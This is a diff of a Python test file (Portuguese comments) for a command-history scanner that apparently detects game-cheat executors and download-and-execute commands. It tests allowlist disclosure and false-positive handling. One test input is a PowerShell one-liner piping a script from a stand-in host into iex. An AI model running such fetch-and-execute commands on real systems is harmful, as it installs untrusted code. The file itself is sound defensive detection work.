@@ -188,13 +188,23 @@ def test_signature_list_assignment_not_flagged():
 
 
 def test_signature_list_helper():
-    """Núcleo: precisa de '|' E de vários executores DISTINTOS (que casem bare)."""
+    """Núcleo: precisa de ALTERNÂNCIA real (≥2 pipes) E ≥3 executores distintos."""
     import command_history as ch
     assert ch._is_signature_list("'solara|krnl|fluxus'") is True
     # Um executor só, mesmo com pipe (pipeline real), NÃO é lista
     assert ch._is_signature_list("krnl | tee log.txt") is False
     # Sem pipe nenhum, não é lista
     assert ch._is_signature_list("run solara.exe") is False
+    # FN evitado: 3 executores rodados de fato (separados por ;) com 1 pipe
+    # não-relacionado NÃO é wordlist — só 1 pipe, não é alternância.
+    assert ch._is_signature_list("solara.exe; krnl.exe; fluxus.exe | tee log") is False
+
+
+def test_multiple_executors_semicolon_still_flagged():
+    """Não pode regredir: rodar vários executores (;) com 1 pipe solto é execução
+    real, tem que acender."""
+    import command_history as ch
+    assert ch._match_in_line("solara.exe; krnl.exe; fluxus.exe | tee log")[0] is not None
 
 
 def test_single_executor_still_flagged_despite_pipe():
@@ -252,6 +262,28 @@ def test_untrusted_domain_irm_iex_still_flagged():
     import command_history as ch
     kw, sev = ch._match_in_line('irm "https://rando.example/x.ps1" | iex')
     assert kw is not None and sev == "high"
+
+
+def test_trusted_domains_disclosed_in_report():
+    """SEGURANÇA: allowlist ativa tem que aparecer no report (meta_only) — senão
+    um trusted_domains.json plantado pelo suspeito suprimiria em silêncio."""
+    import command_history as ch, database
+    # Vazia -> sem item, clean
+    saved = set(database.TRUSTED_DOMAINS)
+    database.TRUSTED_DOMAINS.clear()
+    try:
+        r = ch.scan_trusted_domains_notice()
+        assert r["items"] == [] and r["status"] == "clean"
+        # Com domínio -> item meta_only visível, mas não acende veredito
+        database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
+        r = ch.scan_trusted_domains_notice()
+        assert len(r["items"]) == 1
+        assert r["items"][0]["meta_only"] is True
+        assert _TRUSTED_TEST_DOMAIN in r["items"][0]["detail"]
+        assert r["status"] == "clean"  # meta_only não marca suspeito
+    finally:
+        database.TRUSTED_DOMAINS.clear()
+        database.TRUSTED_DOMAINS.update(saved)
 
 
 # ===== FP v3.38.1: bare folder names colidindo com software legítimo =====
